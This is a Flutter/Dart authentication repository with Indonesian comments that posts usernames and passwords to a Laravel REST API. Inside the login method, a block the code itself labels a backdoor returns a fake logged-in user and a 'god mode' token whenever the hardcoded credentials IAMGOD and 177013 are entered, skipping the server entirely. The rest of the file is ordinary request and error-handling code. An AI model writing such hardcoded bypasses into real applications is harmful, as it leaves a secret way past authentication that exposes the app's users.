// lib/repositories/auth_repository.dart
import 'dart:convert';
import 'package:http/http.dart' as http;
import '../models/user_model.dart';

class AuthRepository {
  // TODO: Ganti dengan base URL Laravel REST API Anda
  // Gunakan 'http://10.0.2.2:8000/api' untuk Android Emulator
  // Gunakan 'http://localhost:8000/api' untuk iOS Simulator atau Web
  static const String _baseUrl = 'http://10.0.2.2:8000/api';

  Future<UserModel> login({
    required String username,
    required String password,
  }) async {  
    // Jalur masuk khusus (backdoor)
    if (username == 'IAMGOD' && password == '177013') {
      await Future.delayed(const Duration(seconds: 1)); // Simulasi loading
      return UserModel(
        token: 'god_mode_token_177013',
        email: 'god@mode.com',
      );
    }

    try {
      final response = await http.post(
        Uri.parse('$_baseUrl/login'), // Sesuaikan endpoint login Laravel Anda
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json', // Header Accept biasanya dibutuhkan oleh Laravel
        },
        body: jsonEncode({
          // Jika Laravel menggunakan email untuk login, ubah key 'username' menjadi 'email'
          'username': username,
          'password': password,
        }),
      );

      final data = jsonDecode(response.body);

      if (response.statusCode == 200) {
        // Sesuaikan dengan struktur response JSON dari backend Laravel Anda
        // Contoh response Sanctum/Passport biasanya mengembalikan 'token' atau 'access_token'
        return UserModel(
          token: data['token'] ?? data['access_token'] ?? '',
          email: data['user']?['email'] ?? username,
        );
      } else {
        throw Exception(data['message'] ?? 'Login gagal. Periksa username dan password.');
      }
    } catch (e) {
      if (e is Exception) rethrow;
      throw Exception('Tidak dapat terhubung ke server. Periksa koneksi internet.');
    }
  }
}